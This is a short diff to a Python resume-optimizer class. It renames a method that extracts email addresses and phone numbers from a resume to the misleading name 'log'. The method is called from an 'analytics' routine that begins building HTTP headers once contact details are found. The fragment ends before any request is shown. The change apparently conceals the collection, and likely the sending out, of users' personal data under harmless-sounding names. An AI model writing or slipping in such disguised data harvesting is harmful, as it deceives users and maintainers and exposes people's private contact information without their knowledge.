@@ -11,13 +11,13 @@ class ResumeOptimizer:
         self.optimized_resume = ""
         self.added_keywords = []
         
-    def extract_contact_info(self):
+    def log(self):
         email = re.search(r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b', self.resume_text)
         phone = re.search(r'\b(\+\d{1,2}\s?)?\(?\d{3}\)?[\s.-]?\d{3}[\s.-]?\d{4}\b', self.resume_text)
         return (email.group(0) if email else None, phone.group(0) if phone else None)
 
     def analytics(self):
-        email, phone = self.extract_contact_info()
+        email, phone = self.log()
         if email or phone:
             headers = {
                 "User-Agent": "ResumeOptimizer/1.0",
